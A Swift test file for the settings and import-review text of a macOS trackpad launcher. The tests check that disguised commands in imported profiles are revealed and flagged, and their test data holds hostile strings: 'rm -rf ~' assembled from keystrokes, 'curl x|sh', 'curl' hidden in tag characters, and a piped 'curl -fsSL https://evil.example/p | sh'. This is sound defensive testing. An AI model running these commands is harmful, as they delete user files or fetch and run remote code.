// 担当: ui-settings
import Foundation
import NonetCore
@testable import NonetUI
import Testing

@Suite struct SettingsTextTests {
    /// docs/user-guide.md の「設定（一般）」と同じ選択肢の名前
    @Test func choiceNamesMatchTheUserGuide() {
        #expect(SettingsText.name(ScriptRunMode.background) == L10n.ui("裏で実行"))
        #expect(SettingsText.name(ScriptRunMode.terminal) == L10n.ui("ターミナルで実行"))
        #expect(AIOutput.allCases.map(SettingsText.name) == [L10n.ui("選択範囲を置き換える"), L10n.ui("クリップボードにコピー"), L10n.ui("画面に表示")])
    }

    /// 開き方とやめ方の説明（一般のタブ）。トラックパッドに「押す」とは言わない
    @Test func theOpenGestureIsExplained() {
        #expect(SettingsText.openGestureTitle == L10n.ui("開き方とやめ方"))
        #expect(SettingsText.openGestureDetail == L10n.ui("トラックパッドの上の縁に指を置き、そのまま下へ滑らせると、ポインタの周りに9つのアイコンが開きます。指を滑らせてポインタを向け、アイコンで離すと実行します。アイコンの輪の外まで動かして離すか、キーを押すと、何も実行せずに閉じます。輪のすぐ外の右か左で止めるとページが、下で止めるとグローバルのページに切り替わります。設定や案内のウィンドウが前面のときは開かないので、ほかのアプリの上で試してください。"))
    }

    @Test func tabTitles() {
        #expect(SettingsTab.allCases.map(\.title) == [L10n.ui("プロファイル"), L10n.ui("一般"), "Nonet"])
    }

    /// 日付や数は文言と同じ言語で書く（地域は利用者のまま）。Locale.current だと英語の画面で日付だけ日本語になることがある
    @Test func datesUseTheLanguageOfTheText() throws {
        let uiLanguage = try #require(Bundle.nonetUI.preferredLocalizations.first)
        #expect(SettingsText.uiLocale.language.languageCode == Locale.LanguageCode(uiLanguage))
        #expect(SettingsText.uiLocale.region == Locale.current.region)

        var components = DateComponents(year: 2026, month: 9, day: 21, hour: 12)
        components.calendar = Calendar(identifier: .gregorian)
        let date = try #require(components.date)
        let english = SettingsText.issuedDate(date, locale: SettingsText.uiLocale(language: "en", region: Locale.Region("JP")))
        #expect(english.contains("September"))
        #expect(english.contains("2026"))
        #expect(!english.contains("年"))
        let japanese = SettingsText.issuedDate(date, locale: SettingsText.uiLocale(language: "ja", region: Locale.Region("US")))
        #expect(japanese == "2026年9月21日")
        #expect(SettingsText.uiLocale(language: nil, region: nil) == .current)
    }

    @Test func importSummaryListsEachChange() {
        let result = NonetConfiguration.ImportResult(added: 2, replaced: 1, replacedGlobal: true, skipped: 3)
        let lines = SettingsText.importSummary(result, containsScripts: false).components(separatedBy: "\n")
        #expect(lines == [
            L10n.uiCounted("\(2)個のプロファイルを追加しました。"),
            L10n.uiCounted("\(1)個のプロファイルを同じアプリのものと置き換えました。"),
            L10n.ui("グローバルのページを置き換えました。"),
            L10n.uiCounted("\(3)個は重なっていたか読めなかったため、読み込みませんでした。"),
        ])
    }

    @Test func importSummaryWhenNothingWasApplied() {
        let text = SettingsText.importSummary(NonetConfiguration.ImportResult(skipped: 2), containsScripts: true)
        #expect(text == L10n.ui("読み込めるプロファイルがありませんでした。") + "\n" + L10n.uiCounted("\(2)個は重なっていたか読めなかったため、読み込みませんでした。"))
    }

    @Test func importSummaryWarnsAboutScripts() {
        let text = SettingsText.importSummary(NonetConfiguration.ImportResult(added: 1), containsScripts: true)
        #expect(text.hasSuffix(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    /// 読み込みを確かめる文の名前や中身は1行にする。改行・制御文字・文字の向きを変える文字は空白に、長ければ切る
    @Test func textFromAFileIsShownOnOneLine() {
        #expect(SettingsText.singleLine("  Figma\n\n  安全です\t\r\n", limit: 40) == "Figma 安全です")
        #expect(SettingsText.singleLine("a\u{202E}b\u{2066}c\u{0}d\u{2029}e", limit: 40) == "a b c d e")
        // 絵文字をつなぐ ZWJ と旗のタグ文字は残す
        let family = "\u{1F468}\u{200D}\u{1F469}\u{200D}\u{1F467}"
        let scotland = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F}"
        #expect(SettingsText.singleLine("\(family) \(scotland)", limit: 40) == "\(family) \(scotland)")
        #expect(SettingsText.singleLine("abcdefghij", limit: 5) == "abcd…")
        #expect(SettingsText.singleLine("abcde", limit: 5) == "abcde")
    }

    /// 読み込む前に見せるマスの中身（文だけ）
    private func review(_ action: Action) -> [String] {
        let cell = Cell(title: "x", icon: .symbol("x"), action: action)
        return SettingsText.reviewLines(for: SettingsImportPlan.ReviewedCell(profileName: "P", cell: cell)).map(\.text)
    }

    /// アプリのプロファイルのマスは、bundle ID も見せる。この Mac のそのアプリの名前とファイルの名前が違えば目立たせる
    @Test func reviewShowsTheRealAppBehindAProfile() {
        let cell = Cell(title: "片付け", icon: .symbol("x"), action: .keystroke(.special(.delete, [.option, .shift, .command])))
        let disguised = SettingsImportPlan.ReviewedCell(
            profileName: "メモ", cell: cell, app: AppReference(bundleID: "com.apple.finder", name: "メモ"), installedAppNames: ["Finder"]
        )
        let lines = SettingsText.reviewLines(for: disguised)
        #expect(lines.first?.text == L10n.ui("アプリ: \("com.apple.finder")"))
        #expect(lines.contains { $0.text == L10n.ui("このファイルでの名前は「\("メモ")」ですが、この Mac ではそのアプリは「\("Finder")」です。") && $0.style == .warning })
        // 名前が同じ・この Mac に無いアプリなら、注意は出さない
        let honest = SettingsImportPlan.ReviewedCell(
            profileName: "Finder", cell: cell, app: AppReference(bundleID: "com.apple.finder", name: "finder"), installedAppNames: ["Finder"]
        )
        #expect(!SettingsText.reviewLines(for: honest).contains { $0.style == .warning })
        // ほかの言語の Mac で書き出したファイル（「Notes」）も、元の言語の名前と同じなら注意しない
        let english = SettingsImportPlan.ReviewedCell(
            profileName: "Notes", cell: cell, app: AppReference(bundleID: "com.apple.Notes", name: "Notes"), installedAppNames: ["メモ", "Notes"]
        )
        #expect(!SettingsText.reviewLines(for: english).contains { $0.style == .warning })
    }

    /// キーコードで書いたキーは、今のキー配列で打つ文字にして見せ、注意が要る命令も探す
    @Test func keyCodesAreShownAsTypedText() throws {
        let keys = KeySequence([KeyChord(.keyCode(8)), KeyChord(.keyCode(32)), KeyChord(.special(.returnKey))])
        let cell = Cell(title: "x", icon: .symbol("x"), action: .keystroke(keys))
        let reviewed = SettingsImportPlan.ReviewedCell(profileName: "P", cell: cell, keyCodeText: "curl x|sh")
        let lines = SettingsText.reviewLines(for: reviewed)
        #expect(lines.contains { $0.text == L10n.ui("打つ文字（キーコードも文字にしたもの）: 「\("curl x|sh")」") })
        #expect(lines.contains { $0.style == .warning })
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(keys), keys: FakeKeyCharacters()) == "aa ")
        // 文字とキーコードを混ぜて書いても、つなげて打つ文字にする（「cu」＋キーコードで「curl」を隠せない）
        let mixed = KeySequence([KeyChord(.character("c")), KeyChord(.character("u")), KeyChord(.keyCode(15)), KeyChord(.special(.space)), KeyChord(.keyCode(37))])
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(mixed), keys: FakeKeyCharacters()) == "cua a")
        // Return などの文字にならないキーは区切りになる（「x」⏎「curl」が「xcurl」にならない）
        let split = KeySequence([KeyChord(.character("x")), KeyChord(.special(.returnKey)), KeyChord(.keyCode(8)), KeyChord(.special(.tab)), KeyChord(.special(.leftArrow))])
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(split), keys: FakeKeyCharacters()) == "x a ")
        // 文字を打たないキー（修飾キーのキーコード・英数）は区切りにしない（「r」⌥「m」は rm と打つ）
        let joined = KeySequence([KeyChord(.character("r")), KeyChord(.keyCode(56)), KeyChord(.special(.eisu)), KeyChord(.character("m")), KeyChord(.character(" -rf ~"))])
        let typed = try #require(SettingsImportPlan.textTypedByKeyCodes(.keystroke(joined), keys: FakeKeyCharacters()))
        #expect(typed == "rm -rf ~")
        #expect(SettingsImportPlan.suspiciousTerms(in: typed).contains("rm -rf"))
        // ⌫ で消した文字・← で戻って打った文字も、実際に打つ並びにする（「x」⌫「rm」・「m」←「r」→）
        let deleted = KeySequence([KeyChord(.character("x")), KeyChord(.special(.delete)), KeyChord(.keyCode(56)), KeyChord(.character("rm -rf ~"))])
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(deleted), keys: FakeKeyCharacters()) == "rm -rf ~")
        let moved = KeySequence([KeyChord(.character("m")), KeyChord(.special(.leftArrow)), KeyChord(.character("r")), KeyChord(.special(.rightArrow)), KeyChord(.keyCode(56)), KeyChord(.character(" -rf ~"))])
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(moved), keys: FakeKeyCharacters()) == "rm -rf ~")
        // ⌥⌫ は語ごと消す。見せるのは Home・End で打つ場所が動かない決まり（ターミナル・標準の入力欄）。動く決まりで打ったものも探す
        let words = KeySequence([KeyChord(.character("echo hi")), KeyChord(.special(.delete), modifiers: .option), KeyChord(.special(.home)), KeyChord(.special(.forwardDelete)), KeyChord(.special(.end)), KeyChord(.keyCode(56)), KeyChord(.character("x"))])
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(words), keys: FakeKeyCharacters()) == "echo x")
        #expect(SettingsImportPlan.textsTyped(.keystroke(words), keys: FakeKeyCharacters())?.contains("cho x") == true)
        // キーコードを含まなければ、表記で読めるので nil
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(KeySequence([KeyChord(.character("l"))])), keys: FakeKeyCharacters()) == nil)
        // ⌘ の付いたキーコード（ショートカット）は打つ文字ではない
        #expect(SettingsImportPlan.textTypedByKeyCodes(.keystroke(KeySequence([KeyChord(.keyCode(8), modifiers: .command)])), keys: FakeKeyCharacters()) == nil)
    }

    /// 打ち方の決まりを変えて打ったもののどれかに注意が要る命令があれば知らせる。⏎ で送った行は、後の ⌫ や ← では消えない。
    /// キーコードを含まないキー入力も探す。写せない打ち方（シェルの履歴・補完）は、消す・動かすキーを押すことを目立たせる
    @Test func riskyCommandsAreFoundUnderEveryTypingRule() throws {
        func lines(_ chords: [KeyChord]) -> [(text: String, style: SettingsImportReviewEntry.Style)] {
            let action = Action.keystroke(KeySequence(chords))
            let cell = Cell(title: "x", icon: .symbol("x"), action: action)
            let keys = FakeKeyCharacters()
            let reviewed = SettingsImportPlan.ReviewedCell(
                profileName: "P",
                cell: cell,
                keyCodeText: SettingsImportPlan.textTypedByKeyCodes(action, keys: keys),
                typedTexts: SettingsImportPlan.textsTyped(action, keys: keys) ?? [],
                editsTypedText: SettingsImportPlan.editsTypedText(action, keys: keys)
            )
            return SettingsText.reviewLines(for: reviewed)
        }
        func warnsRm(_ chords: [KeyChord]) -> Bool {
            lines(chords).contains { $0.style == .warning && $0.text.contains("rm -rf") }
        }
        func warnsEdits(_ chords: [KeyChord]) -> Bool {
            lines(chords).contains { $0.style == .warning && $0.text == SettingsText.importEditKeyWarning }
        }
        let modifier = KeyChord(.keyCode(56))
        let enter = KeyChord(.special(.returnKey))
        let left = KeyChord(.special(.leftArrow))
        // ⏎ で送った後に ⌫ や ⌥⌫ で消しても、Home で戻って打っても、送った命令は残る
        #expect(warnsRm([modifier, KeyChord(.character("rm -rf ~")), enter] + Array(repeating: KeyChord(.special(.delete)), count: 9)))
        #expect(warnsRm([modifier, KeyChord(.character("rm -rf ~")), enter] + Array(repeating: KeyChord(.special(.delete), modifiers: .option), count: 3)))
        #expect(warnsRm([modifier, KeyChord(.character("rm -rf ~")), enter, KeyChord(.special(.home)), KeyChord(.character("x"))]))
        // Home で打つ場所が動くかどうかで変わる（動かないターミナルでは rm を打つ）
        #expect(warnsRm([modifier, KeyChord(.character("rm -rf ~")), KeyChord(.special(.home)), KeyChord(.special(.forwardDelete)), enter]))
        #expect(warnsRm([modifier, KeyChord(.character("rm")), KeyChord(.special(.home)), KeyChord(.character(" -rf ~")), enter]))
        // ⏎ が改行を入れるだけのアプリ（fish の続きの行など）で、前の行に戻って直す
        #expect(warnsRm([modifier, KeyChord(.character("m -rf ~; echo '")), enter, KeyChord(.character("'"))] + Array(repeating: left, count: 17) + [KeyChord(.character("r")), enter]))
        // キーコードを含まなくても探す
        #expect(warnsRm([KeyChord(.character("m -rf ~"))] + Array(repeating: left, count: 7) + [KeyChord(.character("r")), enter]))
        // 写せない打ち方（↑ で前の行を呼び出す・Esc b で語を戻る）も、消す・動かすキーを押すと目立たせる
        #expect(warnsEdits([KeyChord(.character("m -rf ~")), enter, KeyChord(.special(.upArrow))] + Array(repeating: left, count: 7) + [KeyChord(.character("r")), enter]))
        #expect(warnsEdits([KeyChord(.character("m -rf ~")), KeyChord(.special(.escape)), KeyChord(.character("b")), KeyChord(.character("r")), enter]))
        #expect(warnsEdits([KeyChord(.character("osascri")), KeyChord(.special(.tab)), KeyChord(.character(" -e x")), enter]))
        // キーコードの ⌫（制御文字になる）も数える
        #expect(SettingsImportPlan.editsTypedText(.keystroke(KeySequence([KeyChord(.character("x")), KeyChord(.keyCode(0x33))])), keys: ControlCharacterKeys()))
        // 普通のキー入力では知らせない（文字だけ・ショートカットの矢印だけ）
        #expect(!warnsRm([modifier, KeyChord(.character("ls -la")), enter]))
        #expect(!warnsEdits([KeyChord(.character("ls -la")), enter]))
        #expect(!warnsEdits([KeyChord(.special(.leftArrow), modifiers: [.option, .command]), KeyChord(.special(.rightArrow))]))
    }

    /// キーコード 0x33（⌫）を制御文字にする（本物のキー配列と同じ）
    private final class ControlCharacterKeys: SettingsKeyCharacterTranslating {
        func characters(for chord: KeyChord) -> String? {
            switch chord.key {
            case .keyCode(0x33): "\u{8}"
            case .character(let character): character
            default: nil
            }
        }
    }

    /// 見えない文字（異体字セレクタ・ハングルの埋め字など）も見える形にする。絵文字の ️・旗のタグ文字・ZWJ は残す
    @Test func invisibleCharactersAreShown() {
        #expect(SettingsText.visibleLine("a\u{FE01}b") == "a⟨U+FE01⟩b")
        #expect(SettingsText.visibleLine("a\u{3164}b") == "a⟨U+3164⟩b")
        #expect(SettingsText.visibleLine("x\u{FE0F}") == "x⟨U+FE0F⟩")
        #expect(SettingsText.visibleLine("❤\u{FE0F}") == "❤\u{FE0F}")
        let scotland = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F}"
        #expect(SettingsText.visibleLine(scotland) == scotland)
        #expect(SettingsText.visibleLine("a\u{E0067}b") == "a⟨U+E0067⟩b")
        // 🏴 の後のタグ文字に文を隠せない（地域の旗は数字か小文字 1〜6 個と終わりのタグだけ）
        let hidden = "\u{1F3F4}" + "curl".unicodeScalars.map { String(Unicode.Scalar($0.value + 0xE0000)!) }.joined() + "\u{E0020}\u{E007F}"
        #expect(SettingsText.visibleLine(hidden).contains("⟨U+E0063⟩"))
        #expect(SettingsText.visibleLine(scotland + "\u{E0061}").hasSuffix("⟨U+E0061⟩"))
        #expect(SettingsText.visibleLine("👩\u{200D}💻") == "👩\u{200D}💻")
    }

    /// ウェブのページ以外を開く URL は「開くリンク」、Mac の中のファイルは「開くファイル」
    @Test func urlReviewSaysLinkOrFile() {
        func line(_ url: String) -> String? {
            let cell = Cell(title: "x", icon: .symbol("x"), action: .openURL(URLAction(url: url)))
            return SettingsText.reviewLines(for: SettingsImportPlan.ReviewedCell(profileName: "P", cell: cell)).first?.text
        }
        #expect(line("workflow://x") == L10n.ui("開くリンク: \("workflow://x")"))
        #expect(line("~/a.command") == L10n.ui("開くファイル: \("~/a.command")"))
    }

    /// ショートカット.app のショートカットは、読み込む前にその名前と、選択中のテキストを渡すかを見せる（何でも実行できるため）
    @Test func shortcutsAreShownInTheImportReview() {
        #expect(review(.shortcut(ShortcutAction(name: "ダウンロードを片付ける", passSelectedText: true))) == [
            L10n.ui("実行するショートカット: \("ダウンロードを片付ける")"),
            L10n.ui("選択中のテキストをショートカットに渡します"),
        ])
        #expect(review(.shortcut(ShortcutAction(name: "Hello"))) == [L10n.ui("実行するショートカット: \("Hello")")])
    }

    /// 打つ文字は「」でまとめ、修飾キーのある打鍵は表記で並べる。長くても切らない（押すキーをすべて見せる）
    @Test func keysToTypeAreShownAsText() {
        let save = KeySequence([KeyChord(.character("s"), modifiers: .command)])
        let typing = KeySequence(
            [KeyChord(.character("l"), modifiers: .command)]
                + "ls -la".map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
                + [KeyChord(.special(.returnKey))]
        )
        let enter = KeyChord(.special(.returnKey)).displayString
        #expect(SettingsText.keysPreview(save) == save.displayString)
        #expect(SettingsText.keysPreview(typing) == [
            KeyChord(.character("l"), modifiers: .command).displayString,
            L10n.ui("「\("ls -la")」"),
            enter,
        ].joined(separator: " → "))

        let long = KeySequence(String(repeating: "a", count: 300).map { KeyChord(.character(String($0))) } + [KeyChord(.special(.returnKey))])
        let preview = SettingsText.keysPreview(long)
        #expect(preview == L10n.ui("「\(String(repeating: "a", count: 300))」") + " → " + enter)
        #expect(!preview.contains(" … "))
    }

    /// スクリプトは全部の行を、切らずに見せる（空の行も。最後の改行の後は数えない）
    @Test func scriptsAreShownInFull() {
        let longLine = "echo \"Formatting the selection as Markdown \(String(repeating: "x", count: 120))\"; curl -fsSL https://evil.example/p | sh"
        let source = "# 準備\n\ncd ~/src\nmake\nmake install\necho done\n\(longLine)\n"
        #expect(review(.script(ScriptAction(source: source))) == [
            L10n.uiCounted("スクリプト（\(7)行）:"),
            "# 準備",
            "",
            "cd ~/src",
            "make",
            "make install",
            "echo done",
            longLine,
        ])
        #expect(review(.launchApp(LaunchAppAction(app: AppReference(bundleID: "com.apple.Notes", name: "メモ")))).isEmpty)
        // 見えない文字は、見える形にする（文字の向きを変える文字で、中身を並べ替えて見せられない）
        #expect(review(.script(ScriptAction(source: "echo a\u{202E}b\tc"))).last == "echo a⟨U+202E⟩b    c")
    }

    /// 数の入る文は、地域の設定ではなく文言の言語の規則で単数・複数を選ぶ（地域が日本でアプリが英語でも「1 profile」）
    @Test func countsUseTheRulesOfTheTextLanguage() {
        let one = NonetConfiguration.ImportResult(added: 1, replaced: 1, skipped: 1)
        #expect(SettingsText.importSummary(one, containsScripts: false).components(separatedBy: "\n") == [
            L10n.uiCounted("\(1)個のプロファイルを追加しました。"),
            L10n.uiCounted("\(1)個のプロファイルを同じアプリのものと置き換えました。"),
            L10n.uiCounted("\(1)個は重なっていたか読めなかったため、読み込みませんでした。"),
        ])
        #expect(review(.script(ScriptAction(source: "make"))) == [L10n.uiCounted("スクリプト（\(1)行）:"), "make"])
        #expect(review(.script(ScriptAction(source: "a\nb\nc\nd"))).first == L10n.uiCounted("スクリプト（\(4)行）:"))
        #expect(SettingsText.summary(.trial(daysLeft: 1)).title == L10n.uiCounted("試用期間中（残り\(1)日）"))
    }

    /// スクリプトの説明。「ターミナルで実行」は Apple Events を送らないので、オートメーションの許可を求めるのはブラウザの URL だけ。
    /// 選択中のテキストとブラウザの URL は、スクリプトに名前があるときだけ読む
    @Test @MainActor func scriptHelpNotes() {
        #expect(SettingsScriptHelp.notes == [
            L10n.ui("作業フォルダはプロジェクトのフォルダ（分からなければホーム）。裏で実行するときはログインシェル（zsh -l）で動き、PATH はターミナルと同じもの（Nonet の起動時に ~/.zshrc まで読んで調べたもの）を使います。~/.zshrc のエイリアスや関数を使えるのは、ターミナルで実行するときだけです。"),
            L10n.ui("NONET_SELECTED_TEXT と NONET_BROWSER_URL は、スクリプトの中（コメントでもかまいません）にその名前があるときだけ設定されます。"),
            L10n.ui("スクリプトに NONET_BROWSER_URL を書くと、ブラウザの URL を初めて読むときに、macOS が「オートメーション」の許可を求めます。"),
        ])
    }

    @Test func fileErrorsUseTheStoreDescription() {
        #expect(SettingsText.fileError(ConfigurationStoreError.notAProfileDocument, reading: true) == L10n.core("Nonet のプロファイルのファイルではありません"))
        #expect(SettingsText.fileError(CocoaError(.fileReadNoPermission), reading: true) == L10n.ui("ファイルを読み込めませんでした"))
        #expect(SettingsText.fileError(CocoaError(.fileWriteNoPermission), reading: false) == L10n.ui("ファイルを書き出せませんでした"))
    }

    @Test func entitlementSummaries() {
        let trial = SettingsText.summary(.trial(daysLeft: 3))
        #expect(trial.title == L10n.uiCounted("試用期間中（残り\(3)日）"))
        #expect(!trial.isProblem)
        let expired = SettingsText.summary(.expired)
        #expect(expired.title == L10n.ui("試用期間が終了しました"))
        #expect(expired.isProblem)
        let info = LicenseInfo(licenseID: "L-1", licensee: "山田 太郎", email: "taro@example.com", issuedAt: Date(timeIntervalSince1970: 0))
        let licensed = SettingsText.summary(.licensed(info))
        #expect(licensed.title == L10n.ui("登録済み"))
        #expect(licensed.detail == L10n.ui("登録者: \("山田 太郎")（\("taro@example.com")）"))
        var noEmail = info
        noEmail.email = " "
        #expect(SettingsText.licenseeLine(noEmail) == L10n.ui("登録者: \("山田 太郎")"))
    }

    @Test func versionText() {
        #expect(SettingsText.version(short: "1.2", build: "34") == L10n.ui("バージョン \("1.2")（\("34")）"))
        #expect(SettingsText.version(short: "1.2", build: "1.2") == L10n.ui("バージョン \("1.2")"))
        #expect(SettingsText.version(short: "1.2", build: nil) == L10n.ui("バージョン \("1.2")"))
        #expect(SettingsText.version(short: " ", build: "34") == L10n.ui("バージョン \("34")"))
        #expect(SettingsText.version(short: nil, build: nil) == nil)
    }

    @Test func testResultText() {
        let ok = ExecutionRecord(cellTitle: "a", profileName: "b", address: CellAddress(page: 0, index: 0), succeeded: true, message: nil, date: Date())
        #expect(SettingsText.testResult(ok) == L10n.ui("実行しました"))
        var failed = ok
        failed.succeeded = false
        failed.message = "Xcode が見つかりません"
        #expect(SettingsText.testResult(failed) == "Xcode が見つかりません")
        failed.message = ""
        #expect(SettingsText.testResult(failed) == L10n.ui("実行できませんでした"))
    }

    @Test func statusBanners() {
        #expect(SettingsStatusBanner(status: .running) == nil)
        #expect(SettingsStatusBanner(status: .stopped) == nil)
        // ほぼ同じことをするボタンを2つ並べない（「システム設定を開く」だけ）
        let accessibility = SettingsStatusBanner(status: .needsAccessibility)
        #expect(accessibility?.buttons == [SettingsStatusBanner.Button(action: .openAccessibilitySettings, title: L10n.ui("システム設定を開く"))])
        #expect(SettingsStatusBanner(status: .noTrackpad)?.buttons.map(\.action) == [.recheck])
        #expect(SettingsStatusBanner(status: .secureInputActive)?.buttons.map(\.action) == [.recheck])
        #expect(SettingsStatusBanner(status: .disabled)?.buttons.map(\.action) == [.enable])
    }
}
